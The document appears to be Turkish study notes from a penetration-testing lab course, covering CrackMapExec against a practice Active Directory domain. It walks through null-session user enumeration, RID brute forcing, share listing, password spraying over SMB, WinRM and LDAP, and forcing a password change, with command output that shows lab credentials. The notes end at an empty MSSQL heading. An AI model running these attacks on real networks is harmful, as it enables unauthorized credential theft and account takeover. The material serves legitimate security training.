crackmapexec smb 10.129.203.121 -u '' -p '' --users --export $(pwd)/users.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-] Error enumerating
domain users using dc ip 10.129.203.121: NTLM needs domain\username and a
password
SMB 10.129.203.121 445 DC01 [*] Trying with SAMRPC
protocol
SMB 10.129.203.121 445 DC01 [+] Enumerated domain
user(s)
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Guest Built-in account for
guest access to the computer/domain
SMB 10.129.203.121 445 DC01
inlanefreight.htb\carlos
SMB 10.129.203.121 445 DC01
inlanefreight.htb\grace
SMB 10.129.203.121 445 DC01
inlanefreight.htb\peter
SMB 10.129.203.121 445 DC01 
inlanefreight.htb\alina Account for testing HR
App. Password: HRApp123!
SMB 10.129.203.121 445 DC01
inlanefreight.htb\noemi
SMB 10.129.203.121 445 DC01
inlanefreight.htb\engels Service Account for
testing
SMB 10.129.203.121 445 DC01
inlanefreight.htb\kiosko
SMB 10.129.203.121 445 DC01
inlanefreight.htb\testaccount pwd: Testing123!
SMB 10.129.203.121 445 DC01
inlanefreight.htb\mathew
SMB 10.129.203.121 445 DC01
inlanefreight.htb\svc_mssql
```

Export edilen dosyayı, tüm kullanıcıların bir listesini almak için kullanabiliriz; daha sonra bu listeyi kullanacağız.


### Kullanıcı Listesini Çıkarma

```
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt
cat userslist.txt
Guest
carlos
grace
peter
alina
noemi
engels
kiosko
testaccount
mathew
svc_mssql
gmsa_adm
belkis
nicole
jorge
linda
shaun
diana
patrick
elieser

```

Burada, herhangi bir hesap olmadan tüm domain kullanıcılarını ve password policy'yi listeleyebiliriz. Bu yapılandırma her zaman mevcut olmayabilir, ancak mevcutsa, domain'i ele geçirme amacımıza başlamak için bize yardımcı olacaktır.


### Kullanıcıları rid bruteforce ile numaralandırma

Bir domainin kullanıcılarını belirlemek için --rid-brute seçeneği kullanılabilir. Bu seçenek özellikle NULL Authentication'a sahip ancak belirli sorgu kısıtlamaları olan bir domain ile uğraşırken kullanışlıdır. Bu seçeneği kullanarak, domain'deki kullanıcıları ve diğer nesneleri numaralandırabiliriz.


### Enumerating Users with --rid-brute

```
crackmapexec smb 10.129.204.172 -u '' -p '' --rid-brute

SMB 10.129.204.172 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True)
(SMBv1:False)
SMB 10.129.204.172 445 DC01 [+] Brute forcing RIDs
SMB 10.129.204.172 445 DC01 498:
INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB 10.129.204.172 445 DC01 500:
INLANEFREIGHT\Administrator (SidTypeUser)
SMB 10.129.204.172 445 DC01 501:
INLANEFREIGHT\Guest (SidTypeUser)
SMB 10.129.204.172 445 DC01 502:
INLANEFREIGHT\krbtgt (SidTypeUser)
SMB 10.129.204.172 445 DC01 512:
INLANEFREIGHT\Domain Admins (SidTypeGroup)
SMB 10.129.204.172 445 DC01 513:
INLANEFREIGHT\Domain Users (SidTypeGroup)
...SNIP...
SMB 10.129.204.172 445 DC01 1853:
INLANEFREIGHT\abinateps (SidTypeUser)
SMB 10.129.204.172 445 DC01 1854:
INLANEFREIGHT\bustoges (SidTypeUser)
SMB 10.129.204.172 445 DC01 1855:
INLANEFREIGHT\nobseellace (SidTypeUser)
SMB 10.129.204.172 445 DC01 1856:
INLANEFREIGHT\wormithe (SidTypeUser)
SMB 10.129.204.172 445 DC01 1857:
INLANEFREIGHT\therbanstook (SidTypeUser)
SMB 10.129.204.172 445 DC01 1858:
INLANEFREIGHT\sweend (SidTypeUser)
SMB 10.129.204.172 445 DC01 1859:
INLANEFREIGHT\voge1993 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1860:
INLANEFREIGHT\lach1973 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1861:
INLANEFREIGHT\coulart77 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1862:
INLANEFREIGHT\whirds (SidTypeUser)
SMB 10.129.204.172 445 DC01 1863:
INLANEFREIGHT\sturhe (SidTypeUser)
SMB 10.129.204.172 445 DC01 1864:
INLANEFREIGHT\turittly (SidTypeUser)
...SNIP...
```


Varsayılan olarak, `--rid-brute`, RIDs değerlerini brute force ile 4000'e kadar enumerate eder. Davranışını değiştirmek için `--rid-brute [MAX_RID]` kullanabiliriz.

**Not:** Bazı senaryolarda, NULL authentication ile RIDs brute force yapılabilir.


### Enumerating Shares

Paylaşılan klasörler ile ilgili olarak, server konfigürasyonuna bağlı olarak, herhangi bir hesap kullanmadan sadece `--shares` seçeneğini yazarak paylaşımlara erişebiliriz. Eğer hata alırsak, paylaşılan klasörleri listelemek için var olmayan rastgele bir isim veya guest/anonymous hesaplarını şifresiz olarak deneyebiliriz.

#### Enumerating Shares

```
crackmapexec smb 10.129.203.121 -u '' -p '' --shares

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\:
SMB 10.129.203.121 445 DC01 [-] Error enumerating
shares: STATUS_ACCESS_DENIED
```


```
crackmapexec smb 10.129.203.121 -u guest -p '' --shares
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\guest:
SMB 10.129.203.121 445 DC01 [+] Enumerated shares
SMB 10.129.203.121 445 DC01 Share
Permissions Remark
SMB 10.129.203.121 445 DC01 ----- ------
----- ------
SMB 10.129.203.121 445 DC01 ADMIN$
Remote Admin
SMB 10.129.203.121 445 DC01 C$
Default share
SMB 10.129.203.121 445 DC01 carlos
SMB 10.129.203.121 445 DC01 D$
Default share
SMB 10.129.203.121 445 DC01 david
SMB 10.129.203.121 445 DC01 IPC$ READ
Remote IPC
SMB 10.129.203.121 445 DC01 IT
SMB 10.129.203.121 445 DC01 john
SMB 10.129.203.121 445 DC01 julio
SMB 10.129.203.121 445 DC01 linux01
READ,WRITE
SMB 10.129.203.121 445 DC01 NETLOGON
Logon server share
SMB 10.129.203.121 445 DC01 svc_workstations
SMB 10.129.203.121 445 DC01 SYSVOL
Logon server share
SMB 10.129.203.121 445 DC01 Users READ
```


Topladığımız bilgiler, domain içinde foothold elde etmek için faydalı olabilir. Password policy'deki bilgileri kullanarak bir Password Spraying saldırısı düzenleyebilir, ASREPRoasting gibi saldırılar gerçekleştirebilir veya açık bir share folder üzerinden gizli bilgilere erişim sağlayabiliriz.

### Understanding Password Policy

Password Policy için Microsoft belgeleri, Windows için [password policy'lerine](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy) genel bir bakış ve her policy ayarı için bilgi bağlantıları sağlar.

Çıktıda gördüğümüz policy ayarlarından biri, 1 olarak ayarlanmış olan Domain Password Complex'tir.[ Password must meet complexity requirements]([Password must meet complexity requirements - Windows 10 | Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements)) politika ayarı, parolaların bir dizi güçlü parola yönergesini karşılaması gerekip gerekmediğini belirler. Etkinleştirildiğinde, bu ayar parolaların aşağıdaki ölçütleri karşılamasını gerektirir:

* Parolalar, kullanıcının `sAMAccountName` (kullanıcı hesabı adı) değerini veya `displayName`'in tamamını (tam ad değeri) içeremez. Her iki kontrol de büyük/küçük harfe duyarlı değildir.
* Parola aşağıdaki kategorilerden üçünden karakter içermelidir:
	* Avrupa dillerinin büyük harfleri (A'dan Z'ye, aksan işaretleri, Yunanca ve Kiril karakterleri ile birlikte)
	* Avrupa dillerinin küçük harfleri (a'dan z'ye, diyezli, aksan işaretli, Yunanca ve Kiril karakterli)
	*  Taban 10 basamakları (0 ile 9 arası)
	* Alfasayısal olmayan karakterler (özel karakterler):  (`~!@#$%^&*_-+=|\(){} []:;"'<>,.?/) Euro veya İngiliz Sterlini gibi para birimi sembolleri bu policy ayarı için özel karakter olarak sayılmaz.
	* Alfabetik karakter olarak sınıflandırılan ancak büyük veya küçük harf olmayan herhangi bir Unicode karakteri. Bu grup Asya dillerindeki Unicode karakterlerini içerir.

Not: Parolalar değiştirildiğinde veya oluşturulduğunda karmaşıklık gereksinimleri uygulanır.

Password Spraying saldırısı için numaralandırılması gereken bir diğer önemli parametre de `Account Lockout Threshold`'dur (Hesap Kilitleme Eşiği) . Bu policy ayarı, bir kullanıcı hesabının kilitlenmesine neden olacak başarısız oturum açma girişimlerinin sayısını belirler. Kilitli bir hesap, siz sıfırlayana kadar veya `CrackMapExec` çıktısında da görüntülenen Hesap Kilitleme Süresi policy ayarı tarafından belirtilen dakika sayısı sona erene kadar kullanılamaz.

Bu password politikasına göre, herhangi bir **hesap kilitleme politikası (lockout policy)** bulunmamaktadır. Bu nedenle, istediğimiz kadar parola denemesi yapabiliriz ve hesaplar kilitlenmez.

Bu politikaya göre, parolalar **en az yedi karakter** uzunluğunda olmalı ve **en az bir büyük harf, bir küçük harf ve bir özel karakter** içermelidir.

Not: CrackMapExec, varsa `Password Setting Objects`'i (PSO) değil, yalnızca `Default Password Policy`'yi kontrol eder.


Bu bölümde, **`NULL session authentication`** ile yapılandırılmış bir **domain**'den nasıl bilgi alacağımızı öğrendik.

Bir sonraki bölümde, bu bilgileri kullanarak **kimlik bilgilerini nasıl tespit edeceğimizi** öğreneceğiz.


### Password Spraying

NULL Session açığını kötüye kullanan kullanıcıların bir listesini bulduk. Şimdi domain'de bir yer edinmek için geçerli bir şifre bulmamız gerekiyor. Elimizde uygun bir kullanıcı listesi yoksa veya hedef `NULL Session` saldırısına karşı savunmasız değilse, geçerli kullanıcı adlarını bulmak için OSINT (yani `LinkedIn`'de avlanma), geniş bir kullanıcı adı listesi ve `Kerbrute` ile brute-forcing, fiziksel keşif vb. gibi başka bir yola ihtiyacımız olacaktır. Bu bölümde, bir kullanıcı adı listesine sahip olduğumuzda bir dizi hedefe karşı kimlik doğrulamayı test ederek geçerli bir kimlik bilgisi kümesini nasıl bulacağımızı öğreneceğiz.

### Creating a Password List

Bu kullanıcıların şifrelerini bilmiyoruz, ancak bildiğimiz şey şifre politikasıdır. `Welcome1` ve `Password123` gibi yaygın parolalardan oluşan özel bir sözcük listesi, sonunda yıl olan geçerli ay, şirket adı veya domain adı oluşturabilir ve farklı mutasyonlar uygulayabiliriz.  Parola olarak domain'in büyük harf, sayı ve sonunda ünlem işareti ile kullanalım:

### Password List & User List

```
cat passwords.txt
Inlanefreight01!
Inlanefreight02!
Inlanefreight03!
```


```
cat users.txt

noemi
david
carlos
grace
peter
robert
administrator
```


Şimdi **protocol** ve **target** seçmemiz ve `-u` seçeneğini kullanarak **username(ler)** veya **username içeren dosya(lar)** sağlamamız, `-p` seçeneğini kullanarak ise **password(ler)** veya **password içeren dosya(lar)** belirtmemiz gerekiyor. **SMB** **protocol**'ünü kullanarak bazı örneklere bakalım:


### Bir Dosya İçeren Username'ler ile Tek Bir Password Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
```




### Bir Liste İçeren Username'ler ile Tek Bir Password Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p
Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
```



### Bir Liste İçeren Username'ler ile İki Password Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p
Inlanefreight01! Inlanefreight02!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
```

Çıktıdan da görebileceğimiz gibi, yeşil renkle temsil edilen ve `[+]` çıktısıyla başlayan domain'de yalnızca bir geçerli kimlik bilgisi bulduk. Bununla birlikte, tüm hesaplar test edilmemiştir. İlk geçerli kimlik bilgileri bulunduktan sonra, `CME` `password spraying` işlemini `durdurur` çünkü bu genellikle domain numaralandırmasının geri kalanı için yeterlidir. Bazen, ayrıcalıklı bir hesap bulabileceğimiz için tüm hesapları test etmek daha iyidir. Bu amaçla, CME `--continue-on-success` seçeneği ile birlikte gelir:


### Continue on Success

```
crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p
Inlanefreight01! Inlanefreight02! --continue-on-success

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\grace:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\carlos:Inlanefreight02!

```

Ayrıca, her kullanıcı için tüm parolaları test edecek olan passwords.txt gibi bir dosya ile bir parola listesi sağlayabiliriz, bu password spraying için yararlı olabilir, ancak bir Hesap Kilitleme politikası ayarlandığında çok fazla değil. Hesap Kilitleme konusunu bu bölümün ilerleyen kısımlarında ele alacağız.

Hesap kilitlemenin 5 olarak ayarlandığını biliyorsak, bir hesabın kilitlenmesini önlemek için 2 veya 3 paroladan oluşan bir parola listesi oluşturabiliriz.


### Bir Liste İçeren Username'ler ile Bir Password List Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight03! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight03! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\carlos:Inlanefreight02!
```


### Bir User ile Bir Password'ün Eşleşmesini Bir Wordlist Kullanarak Kontrol Etme

CME'nin bir başka harika özelliği de, her kullanıcının parolasını biliyorsak ve hala geçerli olup olmadıklarını test etmek istiyorsak. Bunun için `--no-bruteforce` seçeneğini kullanın. Bu seçenek 1. kullanıcıyı 1. parola ile, 2. kullanıcıyı 2. parola ile ve bu şekilde kullanacaktır.

### Bruteforcing Devre dışı bırak

```
cat userfound.txt
grace
carlos
```

```
cat passfound.txt
Inlanefreight01!
Inlanefreight02!
```

```
crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\carlos:Inlanefreight02!
```


### Testing Local Accounts

Domain hesabı yerine bir `lokal` hesabı test etmek istersek, CrackMapExec'te                  `--local-auth` seçeneğini kullanabiliriz:

### Lokal Hesap Nedir?

- **Lokal hesap**, bir bilgisayara **yalnızca o bilgisayarda** bulunan kullanıcı hesabıdır. Bu hesap, bir **domain**  yönetimi altında değildir.
- Örneğin, bir Windows bilgisayarda "`Administrator`" veya başka bir local kullanıcı hesabı, **lokal hesap**tır.
- Bu hesaplar, sadece o makinede geçerli kullanıcı adı ve şifreye sahiptir.

**Domain hesabı** ise bir **Active Directory (AD)** ortamında tanımlanmış kullanıcı hesabıdır ve domaindeki herhangi bir bilgisayarda kullanılabilir.


### Password Spraying Local Accounts

```
crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --localauth

SMB 192.168.133.157 445 WIN10 [*] Windows 10.0
Build 22000 x64 (name:WIN10) (domain:WIN10) (signing:False) (SMBv1:True)
SMB 192.168.133.157 445 WIN10 [+]
WIN10\Administrator:Password@123

```

Not: Domain Controller'ların lokal bir hesap veritabanı yoktur, bu yüzden bir Domain Controller'a karşı `--local-auth` bayrağını kullanamayız.


###  Account Lockout Hesap Kilitleme

**Password Spraying** gerçekleştirirken dikkatli olun. **Account Lockout Threshold** değerinin **None** olarak ayarlandığından emin olmamız gerekiyor. Eğer bir değer varsa (genellikle **5**), her **account** için deneme sayısına dikkat etmeli ve sayacın **0**'a sıfırlandığı zamanı gözlemlemeliyiz (genellikle **30 dakika**). Aksi takdirde, tüm **account**'ları **30 dakika veya daha uzun süre** kilitleme riski oluşur (**Locked Account Duration** değerini kontrol ederek sürenin ne kadar olduğunu öğrenebilirsiniz). Bazen **domain password policy**, bir **administrator**'ün **account**'ları manuel olarak açmasını gerektirecek şekilde yapılandırılmış olabilir. Bu durumda dikkatsiz yapılan **Password Spraying**, bir veya daha fazla **account**'ı kilitleyerek daha büyük bir sorun yaratabilir. Eğer zaten bir **user account**'ınız varsa, **Bad-Pwd-Count** attribute'u sorgulayabilirsiniz. Bu attribute, **user**'ın yanlış bir **password** kullanarak **account**'a giriş yapmayı kaç kez denediğini gösterir.


### **Bad Password Count** Sorgulama

```
crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated domain
user(s)
SMB 10.129.203.121 445 DC01
inlanefreight.htb\alina badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01 
inlanefreight.htb\peter badpwdcount: 2 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\grace badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\robert badpwdcount: 3 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\carlos badpwdcount: 1 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\svc_workstations badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01 inlanefreight.htb\john
badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\david badpwdcount: 4 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\julio badpwdcount: 3 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\krbtgt badpwdcount: 0 desc: Key
Distribution Center Service Account
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Guest badpwdcount: 0 desc:
Built-in account for guest access to the computer/domain
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Administrator badpwdcount: 0 desc:
Built-in account for administering the computer/domain 
```

Bu bilgilerle, parola saldırıları için daha iyi bir strateji oluşturabilirsiniz.

Not: Kullanıcı doğru kimlik bilgileriyle kimlik doğrulaması yaparsa `Bad Password Count`  sıfırlanır.

Burada kaldım 
### Account Status

Bir hesabı test ettiğimizde, CME'nin görüntüleyebileceği üç renk vardır:

| Renk    | Açıklama                                                               |
| ------- | ---------------------------------------------------------------------- |
| Yeşil   | Kullanıcı adı ve şifre geçerli.                                        |
| Kırmızı | Kullanıcı adı veya şifre geçersiz.                                     |
| Magenta | Kullanıcı adı ve şifre geçerli, ancak kimlik doğrulama başarılı değil. |

Parola hala geçerliyken çeşitli nedenlerle kimlik doğrulama başarısız olabilir. İşte tam bir liste:

| Durum Kodu                    | Açıklama                         |
| ----------------------------- | -------------------------------- |
| STATUS_ACCOUNT_DISABLED       | Hesap devre dışı bırakılmış.     |
| STATUS_ACCOUNT_EXPIRED        | Hesap süresi dolmuş.             |
| STATUS_ACCOUNT_RESTRICTION    | Hesap kısıtlamalı.               |
| STATUS_INVALID_LOGON_HOURS    | Geçersiz oturum açma saatleri.   |
| STATUS_INVALID_WORKSTATION    | Geçersiz workstation.            |
| STATUS_LOGON_TYPE_NOT_GRANTED | Oturum açma türü verilmemiş.     |
| STATUS_PASSWORD_EXPIRED       | Şifre süresi dolmuş.             |
| STATUS_PASSWORD_MUST_CHANGE   | Şifrenin değiştirilmesi gerekli. |
| STATUS_ACCESS_DENIED          | Erişim reddedildi.               |

Nedenine bağlı olarak, örneğin, `STATUS_INVALID_LOGON_HOURS` veya `STATUS_INVALID_WORKSTATION` başka bir workstation veya başka bir zaman denemek için iyi bir fikir olabilir. `STATUS_PASSWORD_MUST_CHANGE` mesajı durumunda, [Impacket smbpasswd](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbpasswd.py) kullanarak kullanıcının şifresini şu şekilde değiştirebiliriz: `smbpasswd -r domain -U user` .


### Şifre Değiştirme: PASSWORD_MUST_CHANGE Durumundaki Hesap için

```
crackmapexec smb 10.129.203.121 -u julio peter -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\julio:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\peter:Inlanefreight01! STATUS_PASSWORD_MUST_CHANGE
```

Burada hedef kullanıcının şifresini değiştirebiliriz. Bir penetrasyon testinde, hesap şifrelerini değiştirme konusunda dikkatli olmalı ve yapılan her türlü hesap değişikliğini raporumuzun eklerinde not etmeliyiz. Hedef hesap uzun süredir giriş yapmamışsa, aktif olarak kullanılan bir hesaba göre şifreyi değiştirmek genellikle daha güvenlidir. Tipik olarak, bir organizasyon kullanılmayan hesapları devre dışı bırakır, ancak zaman zaman şifrelerini değiştirebileceğimiz unutulmuş hesaplarla karşılaşabiliriz ve bu, değerlendirme hedefimize daha da yaklaşmamıza yardımcı olabilir. Şüphe durumunda, her zaman herhangi bir değişiklik yapmadan önce müşteriyle iletişime geçin.

```
smbpasswd -r 10.129.203.121 -U peter

Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user peter
```

Artık yeni parola ile kimlik doğrulaması yapabiliriz.

```
crackmapexec smb 10.129.203.121 -u peter -p Password123

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\peter:Password123

```


### Target Protocol WinRM

Varsayılan olarak, esasen Remote Management (uzaktan yönetim) için tasarlanmış olan[ Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) servisi, bir hedef üzerinde PowerShell komutlarını çalıştırmamıza izin verir. WinRM, Windows Server 2012 R2 / 2016 / 2019 üzerinde `TCP/5985 (HTTP)` ve `TCP/5986 (HTTPS`) portlarında varsayılan olarak etkindir. PowerShell Remoting, [Yönetim için Web Hizmetleri (WSManagement)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protokolünün Microsoft uygulaması olan [Windows Remote Management'](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)ı (WinRM) kullanır

Bir remote bilgisayarda WinRM servisine bağlanmak için, `local administrator` ayrıcalıklarına sahip olmamız, `Remote Management Users` grubunun bir üyesi olmamız veya oturum yapılandırmasında `PowerShell Remoting` için açık izinlere sahip olmamız gerekir.

WinRM, bir parolanın geçerli olup olmadığını belirlemek için en iyi protokol değildir çünkü sadece WinRM erişimi varsa hesabın geçerli olduğunu belirtir. Bu senaryoda, bulduğumuz üç (3) hesabı test edebiliriz ve bu üç (3) hesaptan herhangi birinin WinRM erişimi olup olmadığını görmek için `--no-bruteforce` seçeneğini kullanabiliriz.


### WinRM - Password Spraying

```
crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\peter:Password123
```

```
crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success

SMB 10.129.203.121 5985 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
HTTP 10.129.203.121 5985 DC01 [*]
http://10.129.203.121:5985/wsman
WINRM 10.129.203.121 5985 DC01 [-]
inlanefreight.htb\grace:Inlanefreight01!
WINRM 10.129.203.121 5985 DC01 [-]
inlanefreight.htb\robert:Inlanefreight01!
WINRM 10.129.203.121 5985 DC01 [+]
inlanefreight.htb\peter:Password123 (Pwn3d!)
```

Peter adlı hesabı ile sistemde komutlar çalıştırabiliriz, çünkü bu hesap Local administrator haklarına sahiptir. Bununla ilgili daha fazla bilgiyi `Command Execution` bölümünde ele alacağız.


### LDAP - Password Spraying 

LDAP protokolüne karşı Password Spraying yaparken `FQDN` kullanmamız gerekir, aksi takdirde hata alırız:

### IP kullanılırken hata oluştu

```
crackmapexec ldap 10.129.203.121 -u julio grace -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP 10.129.203.121 445 DC01 [-]
inlanefreight.htb\julio:Inlanefreight01! Error connecting to the domain,
are you sure LDAP service is running on the target ?
LDAP 10.129.203.121 445 DC01 [-]
inlanefreight.htb\grace:Inlanefreight01! Error connecting to the domain,
are you sure LDAP service is running on the target ?

```

Bu sorunu çözmek için iki seçeneğimiz var: saldırı hostumuzu domain name server (DNS) kullanacak şekilde yapılandırmak veya KDC FQDN'sini /etc/hosts dosyamızda yapılandırmak. İkinci seçeneği seçelim ve FQDN'yi /etc/hosts dosyamıza ekleyelim:


### FQDN'nin hosts dosyasına eklenmesi ve Password Spray İşleminin Gerçekleştirilmesi

```
cat /etc/hosts | grep inlanefreight
10.129.203.121 inlanefreight.htb dc01.inlanefreight.htb
```

```
crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p
Inlanefreight01!

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 445 DC01 [-]
inlanefreight.htb\julio:Inlanefreight01!
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01
```


### Authentication (Kimlik Doğrulama) Mekanizmaları

MSSQL, SSH veya FTP gibi bazı Windows servisleri, kendi kullanıcı veritabanlarını işleyecek veya Windows ile entegre olacak şekilde yapılandırılabilir. Bu durumda, servis tarafından kullanılan local veritabanına, Active Directory kullanıcılarına veya servisin kurulu olduğu bilgisayarın local kullanıcılarına karşı Password Spray deneyebiliriz. Farklı kimlik doğrulama mekanizmaları aracılığıyla bir MSSQL Sunucusuna karşı nasıl Passowrd Spray gerçekleştirebileceğimizi görelim.


### MSSQL - Password Spray

